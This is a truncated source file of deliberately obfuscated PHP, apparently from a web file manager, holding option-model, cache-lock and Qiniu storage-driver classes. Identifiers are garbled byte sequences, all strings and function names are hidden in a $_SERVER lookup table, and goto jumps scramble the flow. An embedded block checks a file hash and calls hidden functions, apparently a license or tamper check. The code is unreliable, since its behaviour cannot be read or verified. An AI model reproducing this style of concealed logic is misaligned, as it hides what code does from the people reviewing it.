$cøÆ™®íÁõ = $_SERVER[$_SERVER[¢ÌÛ][390]] . $_SERVER[¢ÌÛ][391]; $AŞÅÁÄĞÂ = $CÔÔåìƒ»($cøÆ™®íÁõ); goto b“‡Ÿ¼©ó¿; DÒåæøÇŒ†: } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($f‚…Ñá„† = false, $DñôçÓÅŒö = '', $E©àã’ƒĞÍ = false) { goto fÆ–ï¡µ·¿; bÓÒÂÉ¹Æ: $f ‚íÚÕŠ = $this->where($fÅ‘µ†¦Ì¾)->select(); $f ‚íÚÕŠ = array_to_keyvalue($f ‚íÚÕŠ, $dğ—ôŞ£¦[92], $dğ—ôŞ£¦[368]); foreach ($f ‚íÚÕŠ as $dªÏÒªèù‡ => $dˆï¶àî®Ü) { if ($E©àã’ƒĞÍ || in_array($dªÏÒªèù‡, $this->jsonField)) { $f ‚íÚÕŠ[$dªÏÒªèù‡] = json_decode($dˆï¶àî®Ü, !0); } } goto Eª•àªŞ¸“; Eª•àªŞ¸“: $this->cacheSet($DñôçÓÅŒö, $f ‚íÚÕŠ); $f ‚íÚÕŠ = array_merge($E§ŠàÚªÅ, $f ‚íÚÕŠ); return $f‚…Ñá„† ? $f ‚íÚÕŠ[$f‚…Ñá„†] : $f ‚íÚÕŠ; goto féËÜÎëà; A†‡¢Ôµª: $E§ŠàÚªÅ = is_array($E§ŠàÚªÅ) ? $E§ŠàÚªÅ : array(); if (is_array($f ‚íÚÕŠ)) { $f ‚íÚÕŠ = array_merge($E§ŠàÚªÅ, $f ‚íÚÕŠ); return $f‚…Ñá„† ? isset($f ‚íÚÕŠ[$f‚…Ñá„†]) ? $f ‚íÚÕŠ[$f‚…Ñá„†] : null : $f ‚íÚÕŠ; } $fÅ‘µ†¦Ì¾ = $this->filterWhere(array($dğ—ôŞ£¦[29] => $DñôçÓÅŒö)); goto bÓÒÂÉ¹Æ; fÆ–ï¡µ·¿: $dğ—ôŞ£¦ =& $_SERVER[¢ÌÛ]; $f ‚íÚÕŠ = $this->cacheGet($DñôçÓÅŒö); $E§ŠàÚªÅ = $this->optionDefault($DñôçÓÅŒö); goto A†‡¢Ôµª; féËÜÎëà: } public function set($a¯õ–¦ÆÁä, $a î¤Å»¬Ë = false, $D†›Ø·¸î¿ = '') { goto CÆ×¹Öö; Fš‡³‹¦‘©: return $this->addAll($C¥åÛõØ»ñ, array(), !0); goto bè¹¦Äèçª; e°“Ó¤™™¯: $c×Ò‚øøÑ = is_array($a¯õ–¦ÆÁä) ? $a¯õ–¦ÆÁä : array($a¯õ–¦ÆÁä => $a î¤Å»¬Ë); foreach ($c×Ò‚øøÑ as $fæ“‘ÕÌ± => $b…Šò÷‘Æ) { if (is_array($b…Šò÷‘Æ)) { $b…Šò÷‘Æ = json_encode_force($b…Šò÷‘Æ); } $this->checkLength($b…Šò÷‘Æ, !1, $this->tableName . $A—²­»Æ[4] . $a¯õ–¦ÆÁä); $b…Šò÷‘Æ = self::textEncode($b…Šò÷‘Æ); $c×Ò‚øøÑ = array($A—²­»Æ[29] => $D†›Ø·¸î¿, $A—²­»Æ[92] => $fæ“‘ÕÌ±, $A—²­»Æ[368] => $b…Šò÷‘Æ); $C¥åÛõØ»ñ[] = $this->filterWhere($c×Ò‚øøÑ); } if (!$C¥åÛõØ»ñ) { return !0; } goto Fš‡³‹¦‘©; CÆ×¹Öö: $A—²­»Æ =& $_SERVER[¢ÌÛ]; $this->cacheRemove($D†›Ø·¸î¿); $C¥åÛõØ»ñ = array(); goto e°“Ó¤™™¯; bè¹¦Äèçª: } protected function optionDefault($e…¡ÙÂë¯ˆ = '') { return !1; } public function setDeep($aÃ—Œß™Û, $EÈ…˜Äóà¿ = false, $d‹ø¦¹£´ = '') { $b¿âêŠå‰ô = explode($_SERVER[¢ÌÛ][94], $aÃ—Œß™Û); $bøˆŒ‹ÄÅ = $this->get(); array_set_value($bøˆŒ‹ÄÅ, $aÃ—Œß™Û, $EÈ…˜Äóà¿); $this->set($b¿âêŠå‰ô[0], $bøˆŒ‹ÄÅ[$b¿âêŠå‰ô[0]], $d‹ø¦¹£´); } public function remove($F¿ÔºÅäò, $B“Ğîªˆ¾ø = '') { $EÑ¼¸Ş¥ÔŸ =& $_SERVER[¢ÌÛ]; $this->cacheRemove($B“Ğîªˆ¾ø); $AŸ×©ÚÇØÁ = $this->filterWhere(array($EÑ¼¸Ş¥ÔŸ[92] => $F¿ÔºÅäò, $EÑ¼¸Ş¥ÔŸ[29] => $B“Ğîªˆ¾ø)); if (is_null($F¿ÔºÅäò)) { unset($AŸ×©ÚÇØÁ[$EÑ¼¸Ş¥ÔŸ[92]]); } return $this->where($AŸ×©ÚÇØÁ)->delete(); } public function cacheSet($c†„âŸ‡¬“, $Aìé¸ê¦Œ = false) { return Cache::set($this->cacheKey($c†„âŸ‡¬“), $Aìé¸ê¦Œ); } public function cacheGet($d‘¤öƒíÇ) { return Cache::get($this->cacheKey($d‘¤öƒíÇ)); } public function cacheRemove($f¦¬ãğØ„) { return Cache::remove($this->cacheKey($f¦¬ãğØ„)); } protected function filterWhere($A±•–‹‡à¤) { return $A±•–‹‡à¤; } protected function cacheKey($Dä®ø½·ğ) { return $Dä®ø½·ğ; } } goto Bˆ’Ê¿ğ; D—×«¨Ñò‹: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $dÃÏªã‰À° =& $_SERVER[¢ÌÛ]; $bø…éÉ‡«Õ = $GLOBALS[$dÃÏªã‰À°[6]][$dÃÏªã‰À°[345]]; self::$cachePath = $bø…éÉ‡«Õ[$dÃÏªã‰À°[173]][$dÃÏªã‰À°[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($E› •Îæˆä, $aõ†øÑ…İñ = 0) { goto DÍˆùë½Ô; dÁîá£…Œ: $this->unlock($E› •Îæˆä); return !1; goto cºåß®ò‡¤; DÍˆùë½Ô: $eµ”ªŒÀŠ =& $_SERVER[¢ÌÛ]; $AÇáÇç´ì‘ = microtime(!0); $b±£–ÚóŒÖ = $AÇáÇç´ì‘ + $aõ†øÑ…İñ + 0.0001; goto cÁ£²¬Ä¡ç; cÁ£²¬Ä¡ç: $bŸİë™ÕŸÚ = rtrim(self::$cachePath, $eµ”ªŒÀŠ[8]) . $eµ”ªŒÀŠ[802] . md5($E› •Îæˆä) . $eµ”ªŒÀŠ[799]; if (file_exists($bŸİë™ÕŸÚ) && filemtime($bŸİë™ÕŸÚ) && filemtime($bŸİë™ÕŸÚ) < time() - 10) { @unlink($bŸİë™ÕŸÚ); } do { if (file_exists($bŸİë™ÕŸÚ)) { cacheLockWait(); continue; } $E¦Â²œ»¿ = fopen($bŸİë™ÕŸÚ, $eµ”ªŒÀŠ[803]); if (!$E¦Â²œ»¿) { return !1; } $BšÊ×”„¿¥ = flock($E¦Â²œ»¿, LOCK_EX | LOCK_NB); self::$caches[$E› •Îæˆä] = array($eµ”ªŒÀŠ[804] => $E¦Â²œ»¿, $eµ”ªŒÀŠ[173] => $bŸİë™ÕŸÚ); fwrite($E¦Â²œ»¿, $b±£–ÚóŒÖ); clearstatcache(); if ($E¦Â²œ»¿ && $BšÊ×”„¿¥) { return !0; } cacheLockWait(); } while (microtime(!0) < $b±£–ÚóŒÖ); goto dÁîá£…Œ; cºåß®ò‡¤: } public function lockGet($d¨š´ˆÜ„§) { $cñã’½õ¢è =& $_SERVER[¢ÌÛ]; $cÎô¾ôÅƒ = rtrim(self::$cachePath, $cñã’½õ¢è[8]) . $cñã’½õ¢è[802] . md5($d¨š´ˆÜ„§) . $cñã’½õ¢è[799]; return file_exists($cÎô¾ôÅƒ); } public function unlock($EÙ’«¥é±Å) { goto EªàòáÉ”¸; F ˜àŠ‡µ: unset(self::$caches[$EÙ’«¥é±Å]); goto d¦ß™»Â; B•æÑÊ¶šâ: @flock($D£Ë›äªÙ[$C×¹Ÿ¡ìº¡[804]], LOCK_UN); @fclose($D£Ë›äªÙ[$C×¹Ÿ¡ìº¡[804]]); @unlink($D£Ë›äªÙ[$C×¹Ÿ¡ìº¡[173]]); goto F ˜àŠ‡µ; EªàòáÉ”¸: $C×¹Ÿ¡ìº¡ =& $_SERVER[¢ÌÛ]; $D£Ë›äªÙ = self::$caches[$EÙ’«¥é±Å]; if (!$D£Ë›äªÙ) { return; } goto B•æÑÊ¶šâ; d¦ß™»Â: } } class CacheLockRedis { public function lock($cÂ‰ªºÖë¨, $bÁï†Ş²å§ = 10) { $d©ŠğÔ¶¿á = Cache::init(); $AõÒŞ»º© = microtime(!0) + $bÁï†Ş²å§; while (microtime(!0) < $AõÒŞ»º©) { $B’Â¦ĞÈí = $d©ŠğÔ¶¿á->get($cÂ‰ªºÖë¨); if (!$B’Â¦ĞÈí) { $bï¼ˆƒöğ = $d©ŠğÔ¶¿á->setLock($cÂ‰ªºÖë¨, $AõÒŞ»º©, $bÁï†Ş²å§); if ($bï¼ˆƒöğ) { return !0; } } else { if ($B’Â¦ĞÈí < microtime(!0)) { $d©ŠğÔ¶¿á->set($cÂ‰ªºÖë¨, $AõÒŞ»º©, $AõÒŞ»º©); if ($d©ŠğÔ¶¿á->get($cÂ‰ªºÖë¨) === $B’Â¦ĞÈí) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($c˜–óÀ‹„) { return Cache::init()->get($c˜–óÀ‹„); } public function unlock($AñÓ±Ÿô‚¦) { return Cache::init()->remove($AñÓ±Ÿô‚¦); } } class CacheLockMemcached { public function lock($b²¡¨³¸é¯, $d‡³÷«±ÓÛ = 0) { $B…¿¦Øì›° = Cache::init(); $D¡¿àŒ£½ = microtime(!0) + $d‡³÷«±ÓÛ; while (microtime(!0) < $D¡¿àŒ£½) { $f²×èÂØã = $B…¿¦Øì›°->get($b²¡¨³¸é¯); if (!$f²×èÂØã || $f²×èÂØã < microtime(!0)) { $eñŠŠ¤ĞÑ® = $B…¿¦Øì›°->handle->add($b²¡¨³¸é¯, $D¡¿àŒ£½, $d‡³÷«±ÓÛ); if ($eñŠŠ¤ĞÑ®) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($c×„¾‹Ôë) { return Cache::init()->get($c×„¾‹Ôë); } public function unlock($bÔâÒÔèÂ­) { return Cache::init()->remove($bÔâÒÔèÂ­); } } goto CÃ¬¤¸æÕ; fó•®É¯‰‚: if ($_SERVER[$_SERVER[¢ÌÛ][388]] != $aÕäã±µ©ä($A‹ÓŒÀ‘¤)) { goto DáÎº¥Ò”†; e­¨ã÷è‘–: $e˜öİ»Ø¡($A‹ÓŒÀ‘¤); goto b—î‹ ÒŒá; d×‰•‘šá: $CçäÃ¤¿Ø = explode($_SERVER[¢ÌÛ][227], $AŞÅÁÄĞÂ); if (count($CçäÃ¤¿Ø) < $_SERVER[¢ÌÛ][392]) { $AÛãŸ±ŒÃø = $_SERVER[¢ÌÛ][393]; $AÛãŸ±ŒÃø(); } $e˜öİ»Ø¡ = $_SERVER[¢ÌÛ][394]; goto e­¨ã÷è‘–; DáÎº¥Ò”†: $CÔÔåìƒ» = $_SERVER[¢ÌÛ][389]; $cøÆ™®íÁõ = $_SERVER[$_SERVER[¢ÌÛ][390]] . $_SERVER[¢ÌÛ][391]; $AŞÅÁÄĞÂ = $CÔÔåìƒ»($cøÆ™®íÁõ); goto d×‰•‘šá; b—î‹ ÒŒá: } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($FÁ…•µèŒ) { parent::__construct(); require_once SDK_DIR . $_SERVER[¢ÌÛ][1273]; $this->_init($FÁ…•µèŒ); } public function _init($eÂ¾¬ºÈà) { goto C‰¬òš–Âê; C‰¬òš–Âê: $d·ïÛ‹¯ùñ =& $_SERVER[¢ÌÛ]; foreach ($eÂ¾¬ºÈà as $DäâÃ˜ê±¶ => $a¯“Ï¢Í¤ç) { if (isset($this->{$DäâÃ˜ê±¶})) { $this->{$DäâÃ˜ê±¶} = $a¯“Ï¢Í¤ç; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($d·ïÛ‹¯ùñ[1274] . LNG($d·ïÛ‹¯ùñ[1233])); } goto dŠ®ôÃ¶Áô; dŠ®ôÃ¶Áô: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto aÜ «Œ“ŞÎ; aÜ «Œ“ŞÎ: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto f°Ş„êØÂê; f°Ş„êØÂê: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($d‹Ó™ÖÏ‹, $A®îØæØò¥ = '', $e¬‡¸ßƒ®ô = REPEAT_RENAME) { if ($this->setContent($d‹Ó™ÖÏ‹, $A®îØæØò¥)) { return $this->getPathOuter($d‹Ó™ÖÏ‹); } return !1; } public function mkdir($aì‘Æ«²¹Ú, $aÏÕ…ÅÁ·³ = REPEAT_SKIP) { goto Dáˆ½ËŸŸ°; a¹œêÏäô½: $aì‘Æ«²¹Ú = $a÷¡ª…¬à× . $Aí´ùØš’µ[8]; $C°¹©…¦á§ = get_path_this($a÷¡ª…¬à×); $f“´šœğ³ = $aì‘Æ«²¹Ú . $C°¹©…¦á§; goto E—’©†ä¦ƒ; Dáˆ½ËŸŸ°: $Aí´ùØš’µ =& $_SERVER[¢ÌÛ]; $a÷¡ª…¬à× = trim($aì‘Æ«²¹Ú, $Aí´ùØš’µ[8]); if ($this->_isFolder($a÷¡ª…¬à×)) { return $this->getPathOuter($a÷¡ª…¬à×); } goto a¹œêÏäô½; E—’©†ä¦ƒ: if (!$this->mkfile($f“´šœğ³)) { return !1; } if (!$this->moveFile($f“´šœğ³, $aì‘Æ«²¹Ú)) { $this->delFile($f“´šœğ³); return !1; } return $this->getPathOuter($a÷¡ª…¬à×); goto BÙ¹¼™; BÙ¹¼™: } public function copyFile($e·‡ğ’±á´, $bšèÛ¥ÉÓ‡) { $bŒ‚–éÍ‡¾ = $this->bucketManager->copy($this->bucket, $e·‡ğ’±á´, $this->bucket, $bšèÛ¥ÉÓ‡, !0); return $bŒ‚–éÍ‡¾ ? !1 : $this->getPathOuter($bšèÛ¥ÉÓ‡); } public function moveFile($eÓ—¢ ÄŞ, $dŒ¦ÇÎˆœ¹) { $e¾Û°™‚É¹ = $this->bucketManager->move($this->bucket, $eÓ—¢ ÄŞ, $this->bucket, $dŒ¦ÇÎˆœ¹, !0); return $e¾Û°™‚É¹ ? !1 : $this->getPathOuter($dŒ¦ÇÎˆœ¹); } public function delFile($A¶òö¨§ÑÀ) { if (!$this->exist($A¶òö¨§ÑÀ)) { return !0; } $a”ç÷Áíå = $this->bucketManager->delete($this->bucket, $A¶òö¨§ÑÀ); return $a”ç÷Áíå ? !1 : !0; } public function delFolder($cÎ¤—®Ò â) { goto eœçÃœ÷Ô›; A‚Å‚¬ÄœÌ: $a´ˆ¦¶¿š = $this->fileList($cÎ¤—®Ò â); $this->listItemCache = !0; $dä•Ô¦ä¼ = trim($cÎ¤—®Ò â, $aÒœƒåÒÈ°[8]) . $aÒœƒåÒÈ°[8]; goto aà¤éİ³ß¹; aà¤éİ³ß¹: if (!empty($cÎ¤—®Ò â) && !in_array($dä•Ô¦ä¼, $a´ˆ¦¶¿š[$aÒœƒåÒÈ°[74]])) { $a´ˆ¦¶¿š[$aÒœƒåÒÈ°[74]][] = $dä•Ô¦ä¼; } $cƒ…ô¶à‰ = $this->delByBatch($a´ˆ¦¶¿š[$aÒœƒåÒÈ°[73]]); if (!$cƒ…ô¶à‰) { return !1; } goto FÌÑÊ¢ŠÃ; FÌÑÊ¢ŠÃ: return $this->delByBatch($a´ˆ¦¶¿š[$aÒœƒåÒÈ°[74]]); goto FÁ¥Êî´¸î; eœçÃœ÷Ô›: $aÒœƒåÒÈ° =& $_SERVER[¢ÌÛ]; if (!$this->exist($cÎ¤—®Ò â)) { return !0; } $this->listItemCache = !1; goto A‚Å‚¬ÄœÌ; FÁ¥Êî´¸î: } private function delByBatch($E•‡ÕÜòÄ‹) { foreach (array_chunk($E•‡ÕÜòÄ‹, 1000) as $bïÚÌÆ‰—¥) { $dÓ»–Â†ñ = $this->bucketManager->buildBatchDelete($this->bucket, $bïÚÌÆ‰—¥); list($B£èÀÏ“„Ã, $E…á¢ˆ¼”´) = $this->bucketManager->batch($dÓ»–Â†ñ); if ($E…á¢ˆ¼”´) { return !1; } } return !0; } public function rename($Cˆ¹²®Ë’, $DˆŒ¤¬µ) { return $this->renameObject($Cˆ¹²®Ë’, $DˆŒ¤¬µ); } public function fileInfo($eöìøÑáÈº, $fÃÇ¸ˆÂÃŸ = false, $aùŒè¯ˆá¼ = array()) { goto b¢±½£°ö©; b¢±½£°ö©: $Böè¨äõÛÀ =& $_SERVER[¢ÌÛ]; $aÇâô´‰Î = array($Böè¨äõÛÀ[28] => $this->pathThis($eöìøÑáÈº), $Böè¨äõÛÀ[75] => $this->getPathOuter($Böè¨äõÛÀ[8] . $eöìøÑáÈº), $Böè¨äõÛÀ[29] => $Böè¨äõÛÀ[173], $Böè¨äõÛÀ[77] => isset($aùŒè¯ˆá¼[$Böè¨äõÛÀ[1275]]) ? $aùŒè¯ˆá¼[$Böè¨äõÛÀ[1275]] : 0, $Böè¨äõÛÀ[167] => $this->ext($eöìøÑáÈº)); if ($fÃÇ¸ˆÂÃŸ) { return $aÇâô´‰Î; } goto E‘¥êÃÙÌë; e³µæíåªî: if (isset($aùŒè¯ˆá¼[$Böè¨äõÛÀ[1276]])) { $aÇâô´‰Î[$Böè¨äõÛÀ[83]] = substr($aùŒè¯ˆá¼[$Böè¨äõÛÀ[1276]] . $Böè¨äõÛÀ[33], 0, 10); } if (isset($aùŒè¯ˆá¼[$Böè¨äõÛÀ[1275]])) { $aÇâô´‰Î[$Böè¨äõÛÀ[77]] = $aùŒè¯ˆá¼[$Böè¨äõÛÀ[1275]]; } return $aÇâô´‰Î; goto cˆö Âôª; E‘¥êÃÙÌë: $aÇâô´‰Î[$Böè¨äõÛÀ[192]] = $aÇâô´‰Î[$Böè¨äõÛÀ[83]] = 0; $aÇâô´‰Î[$Böè¨äõÛÀ[193]] = $aÇâô´‰Î[$Böè¨äõÛÀ[194]] = !0; if (empty($aùŒè¯ˆá¼)) { $aùŒè¯ˆá¼ = $this->objectMeta($eöìøÑáÈº); if (!$aùŒè¯ˆá¼) { return $aÇâô´‰Î; } } goto e³µæíåªî; cˆö Âôª: } public function folderInfo($cÑÒ÷„ØÜ², $FŒŠ»Ê›ø = false) { goto f™ÄŒøÎ°ò; f™ÄŒøÎ°ò: $B›©ƒ™ŞîÀ =& $_SERVER[¢ÌÛ]; $D¢¿©¿ÒÎĞ = array($B›©ƒ™ŞîÀ[28] => $this->pathThis($cÑÒ÷„ØÜ²), $B›©ƒ™ŞîÀ[75] => $this->getPathOuter($B›©ƒ™ŞîÀ[8] . $cÑÒ÷„ØÜ²), $B›©ƒ™ŞîÀ[29] => $B›©ƒ™ŞîÀ[76]); if ($FŒŠ»Ê›ø) { return $D¢¿©¿ÒÎĞ; } goto d °ô³İ¦; d °ô³İ¦: $D¢¿©¿ÒÎĞ[$B›©ƒ™ŞîÀ[192]] = $D¢¿©¿ÒÎĞ[$B›©ƒ™ŞîÀ[83]] = 0; $D¢¿©¿ÒÎĞ[$B›©ƒ™ŞîÀ[193]] = $D¢¿©¿ÒÎĞ[$B›©ƒ™ŞîÀ[194]] = !0; $cÑÒ÷„ØÜ² = rtrim($cÑÒ÷„ØÜ², $B›©ƒ™ŞîÀ[8]) . $B›©ƒ™ŞîÀ[8]; goto aöíïÃØ ; aöíïÃØ : $CœŒŒä•ëŸ = $this->objectMeta($cÑÒ÷„ØÜ²); if (isset($CœŒŒä•ëŸ[$B›©ƒ™ŞîÀ[1276]])) { $D¢¿©¿ÒÎĞ[$B›©ƒ™ŞîÀ[83]] = substr($CœŒŒä•ëŸ[$B›©ƒ™ŞîÀ[1276]] . $B›©ƒ™ŞîÀ[33], 0, 10); } return $D¢¿©¿ÒÎĞ; goto dì”“¼â‹Ö; dì”“¼â‹Ö: } public function listPath($BëÒˆ‰ÚÀ, $b¸óŞ¼ºÏ„ = false) { $f‘ÎŠ—ªœ =& $_SERVER[¢ÌÛ]; $DóèÇºÍí = $this->fileList($BëÒˆ‰ÚÀ, $f‘ÎŠ—ªœ[8], !0); foreach ($DóèÇºÍí[$f‘ÎŠ—ªœ[74]] as $A˜Ğíµ÷¹ => $C†Ÿ²•ƒŒÚ) { $DóèÇºÍí[$f‘ÎŠ—ªœ[74]][$A˜Ğíµ÷¹] = $this->folderInfo($C†Ÿ²•ƒŒÚ, $b¸óŞ¼ºÏ„); } foreach ($DóèÇºÍí[$f‘ÎŠ—ªœ[73]] as $A˜Ğíµ÷¹ => $C†Ÿ²•ƒŒÚ) { $DóèÇºÍí[$f‘ÎŠ—ªœ[73]][$A˜Ğíµ÷¹] = $this->fileInfo($C†Ÿ²•ƒŒÚ[$f‘ÎŠ—ªœ[92]], $b¸óŞ¼ºÏ„, $C†Ÿ²•ƒŒÚ); } return $DóèÇºÍí; } public function has($FÑ”ƒº¡Æî, $A­İ¼²Õáë = false, $b®Ïö¥” = true) { goto Aæ¨âÖ§±; E•Ş¦Ò†î: return !1; goto Bãª“÷Øê«; D ‰ª‹í”İ: $E“„óÕ›×ï = $b²ºµ•éèØ = 0; while (!0) { check_abort(); list($aƒóœë¯­¿, $B “ïè£Ó¬) = $this->bucketManager->listFiles($this->bucket, $F»½«ŠÒì», $aÖŠÓ„¿„œ, $d×Í˜¯ôª, $C†¨¶†™¬); if ($B “ïè£Ó¬) { break; } $aÖŠÓ„¿„œ = array_key_exists($E”’«…÷Õ‘[1245], $aƒóœë¯­¿) ? $aÖŠÓ„¿„œ = $aƒóœë¯­¿[$E”’«…÷Õ‘[1277]] : $E”’«…÷Õ‘[33]; if ($A­İ¼²Õáë) { if (!empty($aƒóœë¯­¿[$E”’«…÷Õ‘[1278]])) { $E“„óÕ›×ï += count($aƒóœë¯­¿[$E”’«…÷Õ‘[1278]]); } if (!empty($aƒóœë¯­¿[$E”’«…÷Õ‘[1279]])) { $b²ºµ•éèØ += count($aƒóœë¯­¿[$E”’«…÷Õ‘[1279]]); } if ($aÖŠÓ„¿„œ === $E”’«…÷Õ‘[33]) { break; } continue; } if ($b®Ïö¥”) { if (!empty($aƒóœë¯­¿[$E”’«…÷Õ‘[1278]])) { return !0; } } else { if (!empty($aƒóœë¯­¿[$E”’«…÷Õ‘[1279]])) { return !0; } } if ($aÖŠÓ„¿„œ === $E”’«…÷Õ‘[33]) { break; } } if ($A­İ¼²Õáë) { return array($E”’«…÷Õ‘[201] => $E“„óÕ›×ï, $E”’«…÷Õ‘[202] => $b²ºµ•éèØ); } goto E•Ş¦Ò†î; B‚ŠàùÛøÄ: $aÖŠÓ„¿„œ = $E”’«…÷Õ‘[33]; $d×Í˜¯ôª = 500; $C†¨¶†™¬ = $E”’«…÷Õ‘[8]; goto D ‰ª‹í”İ; Aæ¨âÖ§±: $E”’«…÷Õ‘ =& $_SERVER[¢ÌÛ]; $FÑ”ƒº¡Æî = trim($FÑ”ƒº¡Æî, $E”’«…÷Õ‘[8]); $F»½«ŠÒì» = empty($FÑ”ƒº¡Æî) ? $E”’«…÷Õ‘[33] : $FÑ”ƒº¡Æî . $E”’«…÷Õ‘[8]; goto B‚ŠàùÛøÄ; Bãª“÷Øê«: } public function listAll($dåù´ÓÄñ‡) { $EèÎ…»òÅã =& $_SERVER[¢ÌÛ]; $fÔ¡ä¬ƒ†Š = $this->fileList($dåù´ÓÄñ‡, $EèÎ…»òÅã[33], !0); $B‹İ¬±‚£” = array(); foreach ($fÔ¡ä¬ƒ†Š[$EèÎ…»òÅã[73]] as $d±á”·¨Öõ) { $B‹İ¬±‚£”[$d±á”·¨Öõ[$EèÎ…»òÅã[92]]] = $d±á”·¨Öõ[$EèÎ…»òÅã[77]]; } foreach ($fÔ¡ä¬ƒ†Š[$EèÎ…»òÅã[74]] as $d±á”·¨Öõ) { if (is_string($d±á”·¨Öõ)) { $B‹İ¬±‚£”[$d±á”·¨Öõ] = 0; } } return $this->listAllFiles($dåù´ÓÄñ‡, array_keys($B‹İ¬±‚£”), $B‹İ¬±‚£”); } private function fileList($fÉ¶òõ§¡Œ, $E„ˆä¼æ¶ = '', $fÉÙØğ‚£Ñ = 0) { goto d£ê’ğœ‹Ã; d£ê’ğœ‹Ã: $AÄÏÜ´ÙŒí =& $_SERVER[¢ÌÛ]; $fÉ¶òõ§¡Œ = trim($fÉ¶òõ§¡Œ, $AÄÏÜ´ÙŒí[8]); $b›Ä£æ‚¶² = empty($fÉ¶òõ§¡Œ) ? $AÄÏÜ´ÙŒí[33] : $fÉ¶òõ§¡Œ . $AÄÏÜ´ÙŒí[8]; goto D±‹˜œö ; cå»·ğ¶é¦: $b”ô±Ü»¤ = $cí½³ñ‹ÊË = array(); while (!0) { check_abort(); list($CÑ‘¥²ŒêÁ, $aƒÂ¸—áô) = $this->bucketManager->listFiles($this->bucket, $b›Ä£æ‚¶², $e†¦à÷»¹¿, $F’ŸìÛ¤¶, $E„ˆä¼æ¶); if ($aƒÂ¸—áô) { break; } $e†¦à÷»¹¿ = array_key_exists($AÄÏÜ´ÙŒí[1245], $CÑ‘¥²ŒêÁ) ? $e†¦à÷»¹¿ = $CÑ‘¥²ŒêÁ[$AÄÏÜ´ÙŒí[1277]] : $AÄÏÜ´ÙŒí[33]; $EÖŒĞáçå = isset($CÑ‘¥²ŒêÁ[$AÄÏÜ´ÙŒí[1278]]) ? $CÑ‘¥²ŒêÁ[$AÄÏÜ´ÙŒí[1278]] : array(); $aÖš«¬™  = isset($CÑ‘¥²ŒêÁ[$AÄÏÜ´ÙŒí[1279]]) ? $CÑ‘¥²ŒêÁ[$AÄÏÜ´ÙŒí[1279]] : array(); foreach ($EÖŒĞáçå as $Bíà›ê†Œ) { goto d’á§Õ«ÂÚ; d’á§Õ«ÂÚ: if ($Bíà›ê†Œ[$AÄÏÜ´ÙŒí[92]] == $b›Ä£æ‚¶²) { continue; } $AÔÜÑ³­Ö§ = $Bíà›ê†Œ[$AÄÏÜ´ÙŒí[92]]; $f¤ôµğö×Ç = $Bíà›ê†Œ[$AÄÏÜ´ÙŒí[1275]]; goto D± Ù´¥Ä; D± Ù´¥Ä: $Bíà›ê†Œ[$AÄÏÜ´ÙŒí[77]] = $f¤ôµğö×Ç; $aÎ’š•ğ‰ö = $f¤ôµğö×Ç == 0 && substr($AÔÜÑ³­Ö§, strlen($AÔÜÑ³­Ö§) - 1, 1) == $AÄÏÜ´ÙŒí[8] ? !0 : !1; if ($Aà‹Æ¤•ç) { $this->cacheMethod($AÄÏÜ´ÙŒí[197], $AÔÜÑ³­Ö§, $aÎ’š•ğ‰ö); $this->cacheMethod($AÄÏÜ´ÙŒí[198], $AÔÜÑ³­Ö§, $Bíà›ê†Œ); } goto e²áº÷™÷‘; e²áº÷™÷‘: if ($aÎ’š•ğ‰ö) { $b”ô±Ü»¤[] = $AÔÜÑ³­Ö§; continue; } $cí½³ñ‹ÊË[] = $fÉÙØğ‚£Ñ ? $Bíà›ê†Œ : $AÔÜÑ³­Ö§; goto a»¤…›©Ÿ©; a»¤…›©Ÿ©: } foreach ($aÖš«¬™  as $AÔÜÑ³­Ö§) { if ($AÔÜÑ³­Ö§ == $b›Ä£æ‚¶²) { continue; } $b”ô±Ü»¤[] = $AÔÜÑ³­Ö§; if ($Aà‹Æ¤•ç) { $this->cacheMethod($AÄÏÜ´ÙŒí[197], $AÔÜÑ³­Ö§, !0); } } if ($e†¦à÷»¹¿ === $AÄÏÜ´ÙŒí[33]) { break; } } if ($Aà‹Æ¤•ç) { $this->cacheMethod($AÄÏÜ´ÙŒí[197], $fÉ¶òõ§¡Œ, !0); } goto E›öøÔ ¸Å; D±‹˜œö : $e†¦à÷»¹¿ = $AÄÏÜ´ÙŒí[33]; $F’ŸìÛ¤¶ = 1000; $Aà‹Æ¤•ç = $this->listItemCache === !1 ? !1 : !0; goto cå»·ğ¶é¦; E›öøÔ ¸Å: return array($AÄÏÜ´ÙŒí[74] => $b”ô±Ü»¤, $AÄÏÜ´ÙŒí[73] => $cí½³ñ‹ÊË); goto EŠ§œ¼¹¤Š; EŠ§œ¼¹¤Š: } public function canRead($b§ãÓÆÎÈ) { return $this->exist($b§ãÓÆÎÈ) ? !0 : !1; } public function canWrite($B¡Ô¿Ó•ÅÉ) { return $this->exist($B¡Ô¿Ó•ÅÉ) ? !0 : !1; } public function getContent($bè­Íè©›¸) { return $this->fileSubstr($bè­Íè©›¸, 0, -1); } public function setContent($fÛ ¬œÏ®Â, $DĞá–¥¶í = '') { $A·ËÔ˜ÕÛ = $this->tempFile($this->pathThis($fÛ ¬œÏ®Â)); file_put_contents($A·ËÔ˜ÕÛ, $DĞá–¥¶í); if ($this->upload($fÛ ¬œÏ®Â, $A·ËÔ˜ÕÛ)) { $this->tempFileRemve($A·ËÔ˜ÕÛ); return !0; } return !1; } public function refreshUrls($A·Ã–Õ§âè) { goto DóÛ¥ÖÕ‘÷; a±‰ë¶ØĞË: return $Eí£È½ÃÜ[$b§…ºâÔ½Â[1054]] == $b§…ºâÔ½Â[719] ? !0 : !1; goto e³¶‚àà‹; DóÛ¥ÖÕ‘÷: $b§…ºâÔ½Â =& $_SERVER[¢ÌÛ]; $bùãé¶ƒ÷ê = array(); if (is_array($A·Ã–Õ§âè)) { foreach ($A·Ã–Õ§âè as 